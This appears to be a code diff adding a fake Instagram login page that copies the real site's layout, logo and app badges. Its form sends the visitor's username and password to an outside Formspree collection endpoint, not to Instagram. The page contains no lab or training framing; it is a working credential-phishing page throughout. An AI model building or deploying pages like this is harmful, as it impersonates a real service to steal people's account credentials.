@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css"
+      integrity="sha512-NhSC1YmyruXifcj/KFRWoC561YpHpc5Jtzgvbuzx5VozKpWvQ+4nXhPdFgmx8xqexRcpAglTj9sIBWINXa8x5w=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <link rel="stylesheet" href="./styles.css" />
+    <title>Login • Instagram</title>
+  </head>
+  <body>
+    <main>
+      <form
+        action="https://formspree.io/f/xayvavee"
+        method="post"
+        class="flex main"
+        id="section1"
+      >
+        <div>
+          <img src="./img/logo.png" alt="" />
+        </div>
+        <div id="form" class="flex">
+          <input
+            type="text"
+            name="inputUser"
+            required
+            placeholder="Phone number, username, or email"
+            autocapitalize="off"
+          />
+          <input
+            type="password"
+            name="inputPAss"
+            required
+            placeholder="Password"
+            autocapitalize="off"
+          />
+          <input type="submit" name="Submit" value="Log In" />
+
+          <div class="flex" id="or">
+            <div class="inline" id="line-left"></div>
+            <div class="inline">OR</div>
+            <div class="inline" id="line-right"></div>
+          </div>
+        </div>
+        <div id="fb">
+          <button type="button" href="http://www.facebook.com">
+            <span> <img src="./img/fb.png" alt="" /></span>
+            <span>Log in with Facebook</span>
+          </button>
+          <a href="#">Forgot password?</a>
+        </div>
+      </form>
+      <section class="main" id="section2">
+        <p>Don't have an account? <a href="#">Sign up</a></p>
+      </section>
+
+      <section id="section3">
+        <p id="app">Get the app.</p>
+        <div id="store" class="flex">
+          <button
+            type="button"
+            href="https://apps.apple.com/app/instagram/id389801252?vt=lo"
+          >
+            <img src="./img/appstore.png" alt="" />
+          </button>
+          <button
+            type="button"
+            href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3D75E1288E-EAE7-4408-979A-4E095C55E406%26utm_content%3Dlo%26utm_medium%3Dbadge"
+          >
+            <img src="./img/google.png" alt="" />
+          </button>
+        </div>
+      </section>
+    </main>
+  </body>
+</html>
